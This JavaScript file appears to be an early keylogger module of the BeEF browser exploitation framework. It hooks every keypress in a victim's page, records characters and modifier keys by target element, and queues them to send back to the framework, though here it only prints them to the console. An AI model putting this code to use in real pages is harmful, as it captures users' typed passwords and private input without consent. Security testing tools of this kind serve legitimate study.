/*!
 * @literal object: beef.logger
 *
 * Provides logging capabilities.
 */
beef.logger = {
	
	/**
	 * Holds events created by user, to be sent back to BeEF
	 */
	events: [],
	/**
	 * Holds current stream of key presses
	 */
	stream: [],
	/**
	 * Contains current target of key presses
	 */
	target: null,
	
	/**
	 * Starts the logger
	 */
	start: function() {
		$j(document).keypress(function(e) { beef.logger.keypress(e) });
	},
	
	/**
	 * Stops the logger
	 */
	stop: function() {
		$j(document).keypress(null);
	},
	
	/**
	 * Temporary function to output results to console.log
	 */
	debug: function() {
		window.console.log(this.events[(this.events.length - 1)]['timestamp'], this.events[(this.events.length - 1)]['data']);
	},
	
	/**
	 * Keypress function fires everytime a key is pressed.
	 * @param {Object} e: event object
	 */
	keypress: function(e) {
		if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0)))
		{
			beef.logger.push_stream();
			this.target = e.target;
		}
		this.stream.push({'timestamp': Number(new Date()), 'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
	},
	
	/**
	 * Pushes the current stream to the events queue
	 */
	push_stream: function() {
		if (this.stream.length > 0)
		{
			this.events.push({'timestamp': beef.logger.get_timestamp(), 'data':beef.logger.parse_stream()});
			this.stream = [];
			beef.logger.debug();
		}
	},
	
	/**
	 * Translate DOM Object to a readable string
	 */
	get_dom_identifier: function() {
		id = this.target.tagName.toLowerCase();
		id += ($j(this.target).attr('id')) ? '#'+$j(this.target).attr('id') : ' ';
		id += ($j(this.target).attr('name')) ? '('+$j(this.target).attr('name')+')' : '';
		return id;
	},
	
	/**
	 * Formats the timestamp
	 * @return {String} timestamp string
	 */
	get_timestamp: function() {
		//return    time - date (seconds since first and last timestamp)
		return '';
	},
	
	/**
	 * Parses stream array and creates history string
	 */
	parse_stream: function() {
		var s = '';
		for (var i in this.stream)
		{
			s += (this.stream[i]['modifiers']['alt']) ? 'Alt+' : '';
			s += (this.stream[i]['modifiers']['ctrl']) ? 'Control+' : '';
			s += (this.stream[i]['modifiers']['shift']) ? 'Shift+' : '';
			s += String.fromCharCode(this.stream[i]['char']);
		}
		return beef.logger.get_dom_identifier()+' > "'+ s+'"';
	}
		
};

beef.regCmp('beef.logger');